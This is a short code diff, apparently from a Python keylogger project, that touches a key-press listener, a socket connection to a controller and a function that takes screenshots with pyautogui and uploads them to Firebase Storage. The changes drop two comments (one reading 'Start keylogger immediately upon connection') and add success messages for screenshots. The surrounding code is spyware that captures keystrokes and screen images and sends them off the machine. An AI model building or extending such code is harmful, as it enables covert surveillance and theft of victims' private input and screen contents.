@@ -22,7 +22,6 @@ if clientSocket:
 
 def on_press(key):
     try:
-        # clientSocket.send("hehe")
         key = str(key)
         key = key.replace("'", "")
         if key == "Key.f12":
@@ -37,6 +36,10 @@ def takeScreenshot():
     print("Name Screen: ", nameScreen)
     try:
         screenshot = pyautogui.screenshot()
+        if screenshot:
+            print("successfully taken screenshot")
+        else:
+            print("Failed to take screenshot")
         screenshot.save(nameScreen)
         # Lưu ảnh vào Firebase Storage
         bucket = storage.bucket()
@@ -57,7 +60,6 @@ def takeScreenshot():
     # link = blob.public_url
     # return link
     
-# Start keylogger immediately upon connection
 with Listener(on_press=on_press) as parent:
     try:
         while True:
